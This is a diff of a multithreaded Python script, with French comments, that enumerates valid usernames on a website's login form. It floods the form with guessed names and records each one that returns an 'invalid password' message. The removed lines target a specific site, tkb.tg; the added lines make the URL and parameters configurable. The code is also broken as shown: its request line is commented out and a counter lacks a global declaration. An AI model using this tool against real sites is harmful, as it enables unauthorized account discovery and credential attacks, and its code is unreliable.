@@ -3,18 +3,37 @@
 import urllib.request as rq
 import time
 import threading
+from config import env 
 
-print(" \t\t DEMARRAGE DU MOTEUR  \n\n")
+class Thread(threading.Thread):
+    def __init__(self,rec):
+        threading.Thread.__init__(self)
+        self.rec=rec
+    def run(self):
+        crack(self.rec)
+        
+
+print(" \t\t DEMARRAGE DU MOTEUR  \n\n\t\t ...partie login ...\n\n")
 global lettre
-lettre=['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','v','w','u','x','y','z','0','1','2','3','4','5','6','7','8','9','']
-
+lettre_optimiz='qwertyuiopasdfghjklzxcvbnm'
+num_optimiz='0123456789'
+Lettre_optimiz='QWERTYUIOPASDFGHJKLZXCVBNM'
+special_optimiz='~!@#$%^&*()_+{`}"|?><:;\'[]=-\\'
+space_optimiz=' '
+num_login_found=0
+lettre_len=25
+Lettre_len=25
+num_len=9
+special_len=28
+#lettre=lettre_optimiz+num_optimiz+space_optimiz
+lettre=lettre_optimiz
 
 def crack(rec):
     # initialisation des variables a utiliser
-    long=36
+    long=lettre_len
     bou=1
     repo5=4
-    num=3
+    num=env.longeur_du_code
     long2=0
     long3=0 
     rec=rec
@@ -63,7 +82,7 @@ def crack(rec):
         # envoye ; reception ; et traitement automatique des requetes HTTP
         while bou:
             try:
-                r = rq.urlopen('http://tkb.tg/login?username='+str(user)+'&password=1')
+                #r = rq.urlopen(env.url+'?'+env.login+'='+str(user)+'&'+env.psw+'=1')
                 bou=0
             except :
                 print("connexion perdu, reconnexion...",end="\r")
@@ -72,16 +91,20 @@ def crack(rec):
         t4=int(((t2-t1)*(36**3))//60)
         t3=int((1/(t2-t1))*18)
         # les logins corrects seront automatiquement ecrit dans un fichier nommer login_found.txt
-        if "invalid password" in str(r.read()):
-            print("login  trouver : {}".format(user))
-            fd=open("login_found.txt",'a')
-            fd.write("login : "+user+"\n")
+        if env.invalid_password_error_msg in str(r.read()):
+            num_login_found+=1
+            print("{} login trouver : {} \n".format(str(num_login_found),user))
+            fd=open(env.nom_fichiers_login,'a')
+            fd.write(user+"\n")
             fd.close()
         else :
-            print("login {} incorrect ||  {}  login/sec || {} min restant ".format(user,t3,t4),end="\r")
+            if 1:
+                print("login {} incorrect ||  {}  login/sec || {} min restant ".format(user,t3,t4),end="\r")
+            else:pass
             
 # code spagetti pour booster X18 le programme
- 
+
+
 def crack1():
     rec=1
     crack(rec)
@@ -212,5 +235,4 @@ t18.join()
 
 print("fermeture du moteur ,bye ")
 time.sleep(2)
-#  code source ecrit par toutpuissantged
-
+exit()
